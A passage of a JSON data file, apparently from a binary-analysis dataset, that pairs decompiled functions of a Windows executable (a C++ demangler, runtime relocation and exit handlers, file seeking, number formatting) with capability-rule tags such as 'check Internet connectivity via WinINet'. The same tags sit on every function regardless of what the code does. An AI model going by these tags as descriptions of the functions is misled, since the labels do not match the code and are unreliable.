        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h_2\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.1400127b0(char *arg1, code *arg2, ulong arg3)\n\n{\n    char *pcVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uchar *arg1_00;\n    code *pcVar4;\n    char cVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uchar *puVar13;\n    uint64_t arg2_00;\n    uint64_t uVar14;\n    char *pcVar15;\n    char *pcVar16;\n    int32_t iVar17;\n    ulong var_8h_2;\n    ulong var_14h;\n    ulong var_20h_2;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_130h;\n    ulong var_138h;\n    ulong var_140h;\n    ulong var_148h;\n    ulong var_150h;\n    ulong var_160h;\n    ulong var_168h;\n    ulong var_170h;\n    ulong var_178h;\n    ulong var_188h;\n    ulong var_1a8h;\n    ulong var_1f8h;\n    ulong var_200h;\n    ulong auStack624 [5];\n    ulong uStack584;\n    uint32_t uStack572;\n    uint64_t uStack568;\n    uchar *puStack560;\n    char *pcStack552;\n    char *pcStack544;\n    uint32_t uStack536;\n    char *pcStack528;\n    uint64_t uStack520;\n    uint uStack512;\n    uint32_t uStack508;\n    uchar *puStack504;\n    uint uStack496;\n    int32_t iStack492;\n    ulong uStack488;\n    ulong uStack480;\n    uint uStack472;\n    int32_t iStack468;\n    uint uStack464;\n    uchar auStack456 [256];\n    int64_t iStack200;\n    uchar uStack192;\n    code *pcStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ulong uStack160;\n    uchar auStack152 [8];\n    ulong uStack144;\n    uint uStack136;\n    ulong uStack128;\n    uchar *puStack120;\n    ulong uStack112;\n    uchar *var_60h;\n    uchar auStack96 [4];\n    ulong var_54h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_14h_2;\n    ulong var_4h;\n    \n    if ((*arg1 != '_') || (iVar17 = 1,  arg1[1] != 'Z')) {\n        auStack624[0] = 0x1400127f9;\n        iVar6 = sub.msvcrt.dll_strncmp(arg1, \"_GLOBAL_\", 8);\n        iVar17 = 0;\n        if ((((iVar6 == 0) &&\n             ((iVar17 = 0,  arg1[8] - 0x24 < 0x3c &&\n              (iVar17 = 0,  (0xf7fffffffffffbfeU >> (arg1[8] - 0x24 & 0x3f) & 1) == 0)))) &&\n            ((cVar5 = arg1[9],  cVar5 == 'D' || (cVar5 == 'I')))) && (iVar17 = 0,  arg1[10] == '_')) {\n            iVar17 = (cVar5 != 'I') + 2;\n        }\n    }\n    uStack584 = arg1 + 1;\n    iStack468 = 1;\n    puStack560 = &stack0xfffffffffffffdd8;\n    uStack572 = (iVar17 != 2) + 0x45;\n    do {\n        auStack624[0] = 0x140012903;\n        iVar7 = sub.msvcrt.dll_strlen(arg1);\n        pcStack544 = arg1 + iVar7;\n        uStack536 = 0x11;\n        iStack492 = iVar7;\n        uVar3 = iStack492 * 2;\n        uStack512 = 0;\n        uStack496 = 0;\n        uStack488 = 0;\n        uStack480 = 0;\n        uStack472 = 0;\n        uStack464 = 0;\n        if (0x800 < uVar3) {\n            return false;\n        }\n        auStack624[0] = 0x140012970;\n        pcStack552 = arg1;\n        pcStack528 = arg1;\n        uStack508 = uVar3;\n        iVar8 = fcn.1400147b0(iVar7);\n        iVar8 = -iVar8;\n        puVar13 = &stack0xfffffffffffffdbf + iVar8;\n        uVar14 = puVar13 & 0xfffffffffffffff8;\n        *(&stack0xfffffffffffffd90 + iVar8) = 0x140012997;\n        iVar7 = fcn.1400147b0(iVar7);\n        arg1_00 = puStack560;\n        iVar7 = -iVar7;\n        uStack520 = uVar14;\n        puStack504 = &stack0xfffffffffffffdb8 + iVar7 + iVar8;\n        if (iVar17 == 1) {\n            if ((*arg1 == '_') && (pcStack528 = uStack584,  arg1[1] == 'Z')) {\n                pcStack528 = arg1 + 2;\n                if ((arg1[2] == 'G') || (arg1[2] == 'T')) {\n                    *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012bbc;\n                    iVar9 = fcn.14000d6b0(&stack0xfffffffffffffdd8);\n                }\n                else {\n                    *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x1400129f9;\n                    iVar9 = fcn.14000e120(&stack0xfffffffffffffdd8, 1);\n                }\n                cVar5 = *pcStack528;\n                pcVar16 = pcStack528;\n                if ((uStack536 & 1) != 0) {\n                    while (cVar5 == '.') {\n                        cVar5 = pcVar16[1];\n                        bVar2 = cVar5 + 0x9fU < 0x1a;\n                        if ((bVar2) || (cVar5 == '_')) {\n                            if ((cVar5 - 0x30U < 10 || bVar2) || (cVar5 == '_')) goto code_r0x000140012a4e;\n                            cVar5 = *pcVar16;\n                            pcVar15 = pcVar16;\n                        }\n                        else {\n                            if (9 < cVar5 - 0x30U) {\n                                cVar5 = *pcStack528;\n                                break;\n                            }\ncode_r0x000140012a4e:\n                            pcVar15 = pcVar16 + 2;\n                            cVar5 = pcVar16[2];\n                            while ((cVar5 + 0x9fU < 0x1a || cVar5 - 0x30U < 10 || (cVar5 == '_'))) {\n                                pcVar1 = pcVar15 + 1;\n                                pcVar15 = pcVar15 + 1;\n                                cVar5 = *pcVar1;\n                            }\n                        }\n                        while (cVar5 == '.') {\n                            while( true ) {\n                                if (9 < pcVar15[1] - 0x30U) goto code_r0x000140012ac5;\n                                cVar5 = pcVar15[2];\n                                pcVar15 = pcVar15 + 2;\n                                if (9 < cVar5 - 0x30U) break;\n                                do {\n                                    pcVar1 = pcVar15 + 1;\n                                    pcVar15 = pcVar15 + 1;\n                                } while (*pcVar1 - 0x30U < 10);\n                                if (*pcVar1 != '.') goto code_r0x000140012ac5;\n                            }\n                        }\ncode_r0x000140012ac5:\n                        pcStack528 = pcVar15;\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012ada;\n                        puVar13 = &stack0xfffffffffffffdd8;\n                        uVar10 = fcn.14000a770(&stack0xfffffffffffffdd8, pcVar16, pcVar15 - pcVar16);\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012aea;\n                        iVar9 = fcn.14000a670(puVar13, 0x4f, iVar9, uVar10);\n                        pcVar16 = pcVar15;\n                        cVar5 = *pcVar15;\n                    }\n                }\n                goto code_r0x0001400128da;\n            }\n        }\n        else {\n            if (iVar17 - 2U < 2) {\n                pcVar16 = arg1 + 0xb;\n                pcStack528 = pcVar16;\n                if ((arg1[0xb] == '_') && (arg1[0xc] == 'Z')) {\n                    puVar13 = &stack0xfffffffffffffdd8;\n                    pcStack528 = arg1 + 0xd;\n                    if ((arg1[0xd] == 'G') || (arg1[0xd] == 'T')) {\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012ba8;\n                        uVar14 = fcn.14000d6b0(puVar13);\n                        pcVar16 = pcStack528;\n                    }\n                    else {\n                        *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012b42;\n                        uVar14 = fcn.14000e120(puVar13, 0);\n                        pcVar16 = pcStack528;\n                    }\n                }\n                else {\n                    uStack568 = uVar14;\n                    *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x14001286d;\n                    iVar6 = sub.msvcrt.dll_strlen(pcVar16);\n                    if (uVar3 != 0) {\n                        uStack512 = 1;\n                        *((puVar13 & 0xfffffffffffffff8) + 4) = 0;\n                        if (0 < iVar6) {\n                            *(puVar13 & 0xfffffffffffffff8) = 0;\n                            *((puVar13 & 0xfffffffffffffff8) + 0x10) = pcVar16;\n                            *((puVar13 & 0xfffffffffffffff8) + 0x18) = iVar6;\n                            uVar14 = uStack568;\n                            puVar13 = puStack560;\n                            goto code_r0x0001400128b5;\n                        }\n                    }\n                    uVar14 = 0;\n                    puVar13 = &stack0xfffffffffffffdd8;\n                }\ncode_r0x0001400128b5:\n                arg2_00 = uStack572;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x1400128c3;\n                iVar9 = fcn.14000a670(puVar13, arg2_00, uVar14, 0);\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x1400128ce;\n                iVar11 = sub.msvcrt.dll_strlen(pcVar16);\n                pcStack528 = pcVar16 + iVar11;\n                cVar5 = pcVar16[iVar11];\n            }\n            else {\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012b11;\n                iVar9 = fcn.14000b340(arg1_00);\n                cVar5 = *pcStack528;\n            }\ncode_r0x0001400128da:\n            if ((iVar9 != 0) && (cVar5 == '\\0')) {\n                iStack200 = 0;\n                uStack192 = 0;\n                uStack168 = 0;\n                uStack160 = 0;\n                uStack136 = 0;\n                pcStack184 = arg2;\n                uStack176 = arg3;\n                uStack128 = 0;\n                uStack112 = 0;\n                _auStack96 = 0;\n                _auStack152 = 0x0;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012c8e;\n                fcn.14000a9f0(&stack0xfffffffffffffe38, iVar9);\n                if (auStack152._4_4_ < 0x800) {\n                }\n                stack0xffffffffffffffa8 = 0;\n                _auStack96 = _auStack96 & 0xffffffff | var_54h * uStack112._4_4_ << 0x20;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012cdc;\n                iVar11 = fcn.1400147b0(1);\n                iVar11 = -iVar11;\n                puStack120 = &stack0xfffffffffffffdb8 + iVar11 + iVar7 + iVar8;\n                *(&stack0xfffffffffffffd90 + iVar11 + iVar7 + iVar8) = 0x140012cf9;\n                iVar12 = fcn.1400147b0(puStack120);\n                var_60h = &stack0xfffffffffffffdb8 + -iVar12 + iVar11 + iVar7 + iVar8;\n                *(&stack0xfffffffffffffd90 + -iVar12 + iVar11 + iVar7 + iVar8) = 0x140012d1f;\n                fcn.1400113f0(&stack0xfffffffffffffe38, 0x11, iVar9);\n                uVar10 = uStack176;\n                iVar9 = iStack200;\n                (&stack0xfffffffffffffe38)[iStack200] = 0;\n                pcVar4 = pcStack184;\n                *(&stack0xfffffffffffffd90 + iVar7 + iVar8) = 0x140012d3e;\n                (*pcVar4)(&stack0xfffffffffffffe38, iVar9, uVar10);\n                return auStack152._0_4_ == 0;\n            }\n        }\n        if (iStack468 != -1) {\n            return false;\n        }\n        iStack468 = 0;\n    } while( true );\n}\n",
        "token_count": 3324
    },
    "140012d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140012d80(int64_t arg1, ulong noname_1, uint32_t *arg3)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint32_t *puStack40;\n    ulong uStack32;\n    \n    uVar2 = *arg3;\n    if (((uVar2 < 2) || (uVar2 == 0x31)) || (uVar2 == 6)) {\n        uVar2 = arg3[1];\n        if (1 < uVar2) {\ncode_r0x000140012e50:\n            *(arg1 + 0x130) = 1;\n            return;\n        }\n        iVar4 = *(arg1 + 0x134);\n        bVar1 = true;\n        if (0x400 < iVar4) goto code_r0x000140012e50;\n    }\n    else {\n        iVar3 = *(arg1 + 0x100);\n        if (iVar3 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar5 = 1;\n            iVar3 = 0;\n        }\n        else {\n            iVar5 = iVar3 + 1;\n        }\n        *(arg1 + 0x100) = iVar5;\n        *(arg1 + iVar3) = 0x28;\n        *(arg1 + 0x108) = 0x28;\n        uVar2 = arg3[1];\n        if ((1 < uVar2) || (iVar4 = *(arg1 + 0x134),  0x400 < iVar4)) {\n            *(arg1 + 0x130) = 1;\n            goto code_r0x000140012e24;\n        }\n        bVar1 = false;\n    }\n    arg3[1] = uVar2 + 1;\n    uStack32 = *(arg1 + 0x148);\n    *(arg1 + 0x134) = iVar4 + 1;\n    *(arg1 + 0x148) = &puStack40;\n    puStack40 = arg3;\n    fcn.14000e2e0(arg1, 0x11, arg3);\n    *(arg1 + 0x148) = uStack32;\n    arg3[1] = arg3[1] - 1;\n    *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n    if (bVar1) {\n        return;\n    }\n    iVar5 = *(arg1 + 0x100);\ncode_r0x000140012e24:\n    if (iVar5 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        iVar3 = 1;\n        iVar5 = 0;\n    }\n    else {\n        iVar3 = iVar5 + 1;\n    }\n    *(arg1 + 0x100) = iVar3;\n    *(arg1 + iVar5) = 0x29;\n    *(arg1 + 0x108) = 0x29;\n    return;\n}\n",
        "token_count": 793
    },
    "14001380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140013800(void)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    code **ppcVar5;\n    \n    if (*0x1401360e0 == 0) {\n        *0x1401360e0 = 1;\n        uVar2 = **0x140110800;\n        if (uVar2 == 0xffffffff) {\n            uVar4 = 0;\n            do {\n                uVar2 = uVar4;\n                uVar4 = uVar2 + 1;\n            } while ((*0x140110800)[uVar4] != 0);\n        }\n        if (uVar2 != 0) {\n            ppcVar5 = *0x140110800 + uVar2;\n            ppcVar1 = *0x140110800 + (uVar2 - (uVar2 - 1)) + -1;\n            do {\n                (**ppcVar5)();\n                ppcVar5 = ppcVar5 + -1;\n            } while (ppcVar5 != ppcVar1);\n        }\n        iVar3 = sub.msvcrt.dll__onexit(0x140013750);\n        return -(iVar3 == 0);\n    }\n    return *0x1401360e0;\n}\n",
        "token_count": 297
    },
    "140013bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.140013bf0(ulong param_1, ulong param_2, ulong param_3, ulong param_4, ulong param_5, ulong param_6, \n                  int64_t *param_7, int64_t param_8)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    int64_t iVar10;\n    int64_t *piVar11;\n    int32_t *piVar12;\n    uint uVar13;\n    uint32_t uVar14;\n    uint64_t arg2;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    int64_t iVar17;\n    int64_t *arg1;\n    int32_t iVar18;\n    ulong var_8h;\n    ulong auStack232 [5];\n    uint auStack192 [2];\n    uint64_t uStack184;\n    uchar auStack176 [16];\n    ulong auStack160 [7];\n    int64_t aiStack104 [2];\n    uchar auStack88 [12];\n    uchar auStack76 [12];\n    ulong var_4h;\n    \n    iVar18 = *0x140136150;\n    if (*0x140136150 != 0) {\n        return;\n    }\n    *0x140136150 = 1;\n    auStack160[2] = 0x140013c37;\n    fcn.140014550();\n    auStack160[2] = 0x140013c4e;\n    iVar10 = fcn.1400147b0(param_5);\n    iVar16 = *0x140110860;\n    puVar7 = *0x140110810;\n    *0x140136154 = 0;\n    iVar10 = -iVar10;\n    *0x140136158 = &stack0xffffffffffffffa8 + iVar10;\n    if (*0x140110810 - *0x140110820 < 8) {\n        *0x140136154 = 0;\n        return;\n    }\n    puVar15 = *0x140110820;\n    if (*0x140110810 - *0x140110820 < 0xc) {\ncode_r0x000140013c8d:\n        if (*puVar15 == 0) {\n            uVar9 = puVar15[1];\ncode_r0x000140013c9a:\n            if (uVar9 == 0) {\n                arg2 = puVar15[2];\n                if (puVar15[2] != 1) {\ncode_r0x000140013f3e:\n                    uVar13 = 0x4010f480;\n                    *(&stack0xffffffffffffff70 + iVar10) = 0x140013f4a;\n                    fcn.140013a10(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, param_7, param_8);\n                    if (*0x140136160 != NULL) {\n                        *(&stack0xffffffffffffff40 + iVar10) = uVar13;\n                        *(&stack0xffffffffffffff48 + iVar10) = arg2;\n                        *(&stack0xffffffffffffff50 + iVar10) = CONCAT88(param_4, param_3);\n                        *(&stack0xffffffffffffff60 + iVar10) = *(&stack0xffffffffffffffa0 + iVar10);\n                        *(&stack0xffffffffffffff18 + iVar10) = 0x140013f88;\n                        (**0x140136160)(&stack0xffffffffffffff40 + iVar10);\n                    }\n                    return;\n                }\n                puVar15 = puVar15 + 3;\n                if (*0x140110810 <= puVar15) {\n                    *0x140136154 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar9 = puVar15[2];\n                        piVar11 = *puVar15 + iVar16;\n                        arg2 = uVar9;\n                        param_8 = *piVar11;\n                        arg1 = puVar15[1] + iVar16;\n                        if ((uVar9 & 0xff) == 0x20) goto code_r0x000140013e68;\n                        uVar14 = uVar9 & 0xff;\n                        if ((uVar9 & 0xff) < 0x21) break;\n                        if (uVar14 != 0x40) {\ncode_r0x000140013f32:\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x140013f3e;\n                            fcn.140013a10(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, param_7, param_8);\n                            goto code_r0x000140013f3e;\n                        }\n                        iVar17 = (*arg1 - piVar11) + param_8;\n                        if (((uVar9 & 0xc0) == 0) && (-1 < iVar17)) goto code_r0x000140013e4f;\n                        *(&stack0xffffffffffffff70 + iVar10) = 0x140013eb8;\n                        fcn.140013a80(arg1);\n                        *arg1 = iVar17;\ncode_r0x000140013d15:\n                        puVar15 = puVar15 + 3;\n                        if (puVar7 <= puVar15) goto code_r0x000140013db0;\n                    }\n                    if (uVar14 == 8) {\n                        uVar2 = *arg1;\n                        if (uVar2 < '\\0') {\n                            iVar17 = (uVar2 | 0xffffffffffffff00) - piVar11;\n                        }\n                        else {\n                            iVar17 = uVar2 - piVar11;\n                        }\n                        iVar17 = iVar17 + param_8;\n                        if (((uVar9 & 0xc0) == 0) && ((0xff < iVar17 || (iVar17 < -0x80)))) {\ncode_r0x000140013e4f:\n                            do {\n                                *(&stack0xffffffffffffff98 + iVar10) = iVar17;\n                                uVar9 = 0x4010f4e8;\n                                *(&stack0xffffffffffffff70 + iVar10) = 0x140013e63;\n                                param_7 = arg1;\n                                piVar11 = fcn.140013a10(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                        , arg2, arg1, param_8);\ncode_r0x000140013e68:\n                                uVar14 = *arg1;\n                                if (uVar14 < 0) {\n                                    iVar17 = (uVar14 | 0xffffffff00000000) - piVar11;\n                                }\n                                else {\n                                    iVar17 = uVar14 - piVar11;\n                                }\n                                iVar17 = iVar17 + param_8;\n                            } while (((uVar9 & 0xc0) == 0) && ((iVar17 < -0x80000000 || (0xffffffff < iVar17))));\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x140013ea2;\n                            fcn.140013a80(arg1);\n                            *arg1 = iVar17;\n                        }\n                        else {\n                            *(&stack0xffffffffffffff70 + iVar10) = 0x140013d12;\n                            fcn.140013a80(arg1);\n                            *arg1 = iVar17;\n                        }\n                        goto code_r0x000140013d15;\n                    }\n                    if (uVar14 != 0x10) goto code_r0x000140013f32;\n                    uVar3 = *arg1;\n                    if (uVar3 < 0) {\n                        iVar17 = (uVar3 | 0xffffffffffff0000) - piVar11;\n                    }\n                    else {\n                        iVar17 = uVar3 - piVar11;\n                    }\n                    iVar17 = iVar17 + param_8;\n                    if (((uVar9 & 0xc0) == 0) && ((iVar17 < -0x8000 || (0xffff < iVar17)))) goto code_r0x000140013e4f;\n                    puVar15 = puVar15 + 3;\n                    *(&stack0xffffffffffffff70 + iVar10) = 0x140013d9c;\n                    fcn.140013a80(arg1);\n                    *arg1 = iVar17;\n                } while (puVar15 < puVar7);\n                goto code_r0x000140013db0;\n            }\n        }\n    }\n    else if (**0x140110820 == 0) {\n        uVar9 = (*0x140110820)[1];\n        if ((uVar9 | (*0x140110820)[2]) == 0) {\n            puVar15 = *0x140110820 + 3;\n            goto code_r0x000140013c8d;\n        }\n        goto code_r0x000140013c9a;\n    }\n    if (*0x140110810 <= puVar15) {\n        *0x140136154 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar15 + 1;\n        uVar9 = *puVar15;\n        puVar15 = puVar15 + 2;\n        piVar12 = *puVar1 + iVar16;\n        iVar4 = *piVar12;\n        *(&stack0xffffffffffffff70 + iVar10) = 0x140013f26;\n        fcn.140013a80(piVar12);\n        *piVar12 = uVar9 + iVar4;\n    } while (puVar15 < puVar7);\ncode_r0x000140013db0:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x140136154) {\n        iVar16 = 0;\n        do {\n            piVar12 = *0x140136158 + iVar16;\n            iVar4 = *piVar12;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar12 + 4);\n                uVar6 = *(piVar12 + 2);\n                *(&stack0xffffffffffffff70 + iVar10) = 0x140013def;\n                (*pcVar8)(uVar6, uVar5, iVar4, &stack0xffffffffffffffb4);\n            }\n            iVar18 = iVar18 + 1;\n            iVar16 = iVar16 + 0x28;\n        } while (iVar18 < *0x140136154);\n    }\n    return;\n}\n",
        "token_count": 2342
    },
    "1400142b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1400142b0(ulong noname_0, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg2 != 2) {\n        if (arg2 < 3) {\n            if (arg2 == 0) {\n                if (*0x1401361a8 != 0) {\n                    fcn.140014140();\n                }\n                iVar2 = *0x1401361a0;\n                if (*0x1401361a8 == 1) {\n                    while (iVar2 != 0) {\n                        iVar1 = *(iVar2 + 0x10);\n                        fcn.14001e510(iVar2);\n                        iVar2 = iVar1;\n                    }\n                    *0x1401361a0 = 0;\n                    *0x1401361a8 = 0;\n                    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x1401361c0);\n                }\n            }\n            else {\n                if (*0x1401361a8 == 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x1401361c0);\n                }\n                *0x1401361a8 = 1;\n            }\n        }\n        else if ((arg2 == 3) && (*0x1401361a8 != 0)) {\n            fcn.140014140();\n        }\n        return 1;\n    }\n    fcn.140013a00();\n    return 1;\n}\n",
        "token_count": 328
    },
    "140014c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140014c00(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    ulong in_RAX;\n    \n    if (arg2 < 2) {\n        arg1[arg2 + 2] = arg3;\n        return in_RAX;\n    }\n    sub.msvcrt.dll_abort();\n    return *arg1;\n}\n",
        "token_count": 77
    },
    "140014fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140014fe0(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) != 0) goto code_r0x000140014ff5;\n    fcn.140014ef0(arg1);\n    do {\n        sub.msvcrt.dll_abort();\ncode_r0x000140014ff5:\n        fcn.140014b80(arg1);\n    } while( true );\n}\n",
        "token_count": 92
    },
    "14001598": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140015980(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    int64_t aiStack32 [2];\n    \n    if (arg3 == 1) {\n        iVar1 = sub.msvcrt.dll_fgetpos();\n        if (iVar1 != 0) {\n            return 0xffffffff;\n        }\n        arg2 = arg2 + aiStack32[0];\n    }\n    else if (arg3 == 2) {\n        sub.msvcrt.dll_fflush();\n        uVar2 = sub.msvcrt.dll__fileno(arg1);\n        iVar4 = sub.msvcrt.dll__filelengthi64(uVar2);\n        arg2 = arg2 + iVar4;\n    }\n    else if (arg3 != 0) {\n        puVar5 = sub.msvcrt.dll__errno();\n        *puVar5 = 0x16;\n        return 0xffffffff;\n    }\n    aiStack32[0] = arg2;\n    uVar3 = sub.msvcrt.dll_fsetpos(arg1, aiStack32);\n    return uVar3;\n}\n",
        "token_count": 271
    },
    "140015bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.140015bf0(ulong arg1, uint32_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t arg1_00;\n    uint *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t uStack80;\n    uint32_t auStack76 [3];\n    uint64_t arg2_00;\n    \n    arg1_00 = fcn.14001d8c0(arg1, auStack76, &uStack80);\n    uVar3 = *arg2;\n    uVar8 = uStack80 - uVar3;\n    arg2_00 = uVar8;\n    auStack76[0] = auStack76[0] + uVar8;\n    if (uVar8 < 1) {\n        uVar5 = 0;\n        if (in_stack_00000028 == 0) goto code_r0x000140015d00;\n        if (uVar8 != 0) {\n            uVar5 = uVar3 - uStack80;\n            uStack80 = uVar8;\n            arg1_00 = fcn.14001d470(arg1_00, uVar5);\n            uVar8 = uStack80;\n        }\n        uStack80 = uVar8;\n        uVar4 = 0;\n        uVar9 = 0;\n    }\n    else if (uVar3 == 0x35) {\n        uVar5 = 0;\n        if ((in_stack_00000028 == 0) || (uVar5 = 0,  arg2[3] != 1)) goto code_r0x000140015d00;\n        uStack80 = uVar8;\n        uVar4 = fcn.14001dc40(arg1_00, arg2_00);\n        uVar9 = (uVar4 != 0) << 4;\n        fcn.14001c7b0(arg1_00, uStack80);\n    }\n    else if (in_stack_00000030 == 1) {\n        uStack80 = uVar8;\n        uVar4 = fcn.14001dc40(arg1_00, arg2_00);\n        fcn.14001c7b0(arg1_00, uStack80);\ncode_r0x000140015e76:\n        uVar9 = (uVar4 != 0) << 4;\n    }\n    else {\n        if (in_stack_00000030 == 2) {\n            uStack80 = uVar8;\n            uVar4 = fcn.14001dc40(arg1_00, arg2_00);\n            fcn.14001c7b0(arg1_00, uStack80);\n        }\n        else {\n            iVar7 = uVar8 - 1;\n            if (iVar7 == 0) {\n                uVar5 = 0;\n                if (in_stack_00000028 == 0) goto code_r0x000140015d00;\n                uVar5 = *(arg1_00 + 0x18) >> 1;\n            }\n            else {\n                uVar5 = *(arg1_00 + 0x18 + (iVar7 >> 5) * 4) >> (iVar7 & 0x1f);\n            }\n            uStack80 = uVar8;\n            uVar4 = fcn.14001dc40(arg1_00, arg2_00);\n            fcn.14001c7b0(arg1_00, uStack80);\n            if ((uVar5 & 1) == 0) goto code_r0x000140015e76;\n        }\n        arg1_00 = fcn.140015b30(arg1_00);\n        uVar8 = uVar3 & 0x1f;\n        if (uVar8 != 0) {\n            uVar8 = 0x20 - uVar8;\n        }\n        puVar2 = arg1_00 + 0x18 + (*(arg1_00 + 0x14) + -1) * 4;\n        uVar5 = 0x1f;\n        if (*puVar2 != 0) {\n            for (; *puVar2 >> uVar5 == 0; uVar5 = uVar5 - 1) {\n            }\n        }\n        if ((uVar5 ^ 0x1f) == uVar8) {\n            uVar9 = 0x20;\n        }\n        else {\n            if (uVar4 == 0) {\n                uVar4 = *(arg1_00 + 0x18) & 1;\n            }\n            fcn.14001c7b0(arg1_00, 1);\n            uVar9 = 0x20;\n            auStack76[0] = auStack76[0] + 1;\n        }\n    }\n    uVar8 = arg2[1];\n    if (auStack76[0] < uVar8) {\n        uVar10 = uVar8 - auStack76[0];\n        auStack76[0] = uVar8;\n        if ((uVar3 < uVar10) || (uVar5 = 